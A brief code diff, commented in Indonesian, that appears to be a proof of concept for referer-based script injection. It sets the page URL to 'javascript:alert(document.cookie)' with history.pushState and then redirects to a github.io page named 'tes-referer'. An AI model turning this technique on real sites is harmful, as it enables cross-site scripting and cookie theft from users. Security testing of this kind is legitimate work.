@@ -1,5 +1,8 @@
 <script>
-    history.pushState({}, '', "https://evil.com");
+// Ini valid karena dijalankan di evil.com dan mengubah URL ke skema javascript di domain yang sama (pada browser tertentu/lama)
+history.pushState({}, '', "javascript:alert(document.cookie)"); 
 
-    location.href = "http://example.com";
+// Setelah itu baru lakukan pengalihan ke situs target korban
+window.location = "https://cyberrgen002.github.io/tes-referer/";
+
   </script>
